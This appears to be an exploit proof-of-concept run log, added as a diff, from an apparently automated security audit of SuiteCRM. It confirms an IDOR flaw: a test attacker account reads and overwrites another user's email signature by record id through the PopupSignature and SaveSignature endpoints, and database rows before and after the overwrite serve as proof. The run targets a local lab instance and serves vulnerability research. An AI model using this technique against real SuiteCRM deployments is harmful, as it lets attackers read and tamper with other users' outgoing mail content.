@@ -1,0 +1,26 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-033/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-033/../.venv
+========================================================================
+VULN-033: Users signatures: read + overwrite any user's signature (IDOR)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login; provisioning victim (V) and attacker (A)
+[INFO] victim   = mod_144a0d30 (b27d955a-9edd-4dc9-b0b7-aa50e26e6d66)
+[INFO] attacker = mod_58b5a588 (fd1fca01-8c1a-43bc-8530-429df8604d7f)
+[SETUP] as V: create her own e-mail signature via SaveSignature (record empty -> new row, user_id=the_user_id)
+[OK] Signature created: id=d85a492e-d58c-495a-8bee-0b331ec0510c name='V033Sig_d874a965' body marker='SECRETSIG033_941ab45d', user_id=V
+[INFO] db row before attack:
+id	user_id	name	signature_html	deleted
+d85a492e-d58c-495a-8bee-0b331ec0510c	b27d955a-9edd-4dc9-b0b7-aa50e26e6d66	V033Sig_d874a965	<p>SECRETSIG033_941ab45d</p>	0
+[STEP] as A: read V's signature purely by id (PopupSignature)
+[PROOF] read status=200 len=102799 -- V's body marker present in A's response: True
+[STEP] as A: overwrite V's signature content by id (SaveSignature), leaving user_id untouched
+[INFO] overwrite status=200
+[STEP] verify via db container: same row id, user_id UNCHANGED (still V), content now attacker's
+[PROOF] db row after attacker's overwrite:
+id	user_id	name	signature_html	deleted
+d85a492e-d58c-495a-8bee-0b331ec0510c	b27d955a-9edd-4dc9-b0b7-aa50e26e6d66	pwned-by-attacker	<p>PWNEDSIG033_440c7048</p>	0
+[PROOF] row user_id still == victim's id (ownership unchanged): True
+[PROOF] row signature_html now contains attacker payload: True
+[OK] attacker read AND overwrote victim's own signature; victim's future outgoing mail now carries attacker content
+==> VULN-033: CONFIRMED — read leaked 'SECRETSIG033_941ab45d'; overwrite planted 'PWNEDSIG033_440c7048' on V's row (user_id unchanged)
